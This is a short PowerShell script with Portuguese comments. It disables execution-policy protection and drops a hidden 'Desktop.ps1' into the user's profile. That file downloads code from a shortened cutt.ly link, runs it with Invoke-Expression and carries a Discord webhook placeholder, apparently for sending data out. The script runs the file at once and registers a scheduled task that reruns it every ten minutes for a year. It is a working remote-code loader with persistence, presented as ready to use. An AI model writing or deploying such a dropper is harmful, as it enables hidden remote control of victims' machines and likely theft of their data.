# Permitir executar powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force

# Define o conte�do do arquivo PowerShell
$dc = 'https://discord.com/api/webhooks/token here'
$scriptContent = @"
Start-Sleep -Milliseconds 500
`$dc = '$dc'
Invoke-Expression (Invoke-WebRequest -Uri "http://cutt.ly/ClankPT" -UseBasicParsing).Content
"@

# Obter o diret�rio do perfil do usu�rio logado
$userProfileDir = $env:USERPROFILE

# Caminho completo do arquivo, incluindo o nome e a extens�o
$filePath = Join-Path -Path $userProfileDir -ChildPath "Desktop.ps1"

# Cria o arquivo com o conte�do especificado e define o atributo Hidden
$scriptContent | Out-File -FilePath $filePath -Encoding utf8
Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Executa o script imediatamente
& $filePath

# Cria um novo agendamento para executar o script PowerShell a cada 10 minutos
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File `"$filePath`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 365)

# Registra a tarefa agendada
Register-ScheduledTask -TaskName "ExecutarScriptPowerShell" -Action $action -Trigger $trigger -Description "Agendamento para executar o script PowerShell a cada 10 minutos"
